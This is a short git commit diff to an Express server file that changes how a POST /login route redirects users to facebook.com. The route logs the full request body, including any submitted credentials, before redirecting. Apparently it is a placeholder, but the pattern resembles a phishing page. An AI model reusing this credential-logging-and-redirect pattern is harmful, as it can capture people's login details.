47f2ae4f07ac6d81336f96daf35ab60001d9b1a3
Chris68204 <kelsonchriskoubung@gmail.com>
2026-01-19 22:15:54 -0500

    Replace res.writeHead with res.redirect in login route

--- server.js
+++ server.js
@@ -50,7 +50,7 @@ app.post("/signup", async (req, res) => {
 // Login route (we'll improve this later)
 app.post("/login", (req, res) => {
   console.log(req.body);
-  res.writeHead(302, {Location:"https://www.facebook.com/"});
+  res.redirect("https://www.facebook.com/");
 });
 
 
